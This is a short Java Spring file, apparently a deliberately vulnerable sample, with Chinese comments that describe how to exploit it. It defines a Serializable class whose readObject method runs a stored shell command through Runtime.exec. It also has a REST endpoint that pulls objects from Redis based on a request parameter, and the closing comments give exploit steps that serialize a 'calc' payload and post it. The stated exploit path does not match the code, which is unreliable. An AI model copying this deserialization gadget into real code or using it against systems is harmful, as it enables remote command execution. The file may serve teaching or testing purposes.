import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Component;
import java.io.*;
import java.util.*;

@Component
class SystemConfig implements Serializable {
    private String cmd;
    public SystemConfig(String cmd) { this.cmd = cmd; }
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(cmd);
    }
}

@Service
class DataCleaner {
    private final RedisTemplate<String, Object> redisTemplate;
    public DataCleaner(RedisTemplate<String, Object> redisTemplate) {
        this.redisTemplate = redisTemplate;
    }
    public void process(String key) {
        Object config = redisTemplate.boundValueOps(key).get();
        if (config instanceof SystemConfig) {
            System.out.println("Config processed");
        }
    }
}

@RestController
class DataController {
    private final DataCleaner cleaner;
    public DataController(DataCleaner cleaner) {
        this.cleaner = cleaner;
    }
    @PostMapping("/clean")
    public String handle(@RequestParam String key) {
        cleaner.process(key);
        return "Processed";
    }
}

// 漏洞利用示例：
// 1. 攻击者构造恶意对象：
//    ByteArrayOutputStream bos = new ByteArrayOutputStream();
//    ObjectOutputStream out = new ObjectOutputStream(bos);
//    out.writeObject(new SystemConfig("calc"));
//    String maliciousKey = Base64.getEncoder().encodeToString(bos.toByteArray());
// 2. 发送请求：POST /clean?key=maliciousKey
// 结果：触发反序列化漏洞执行任意命令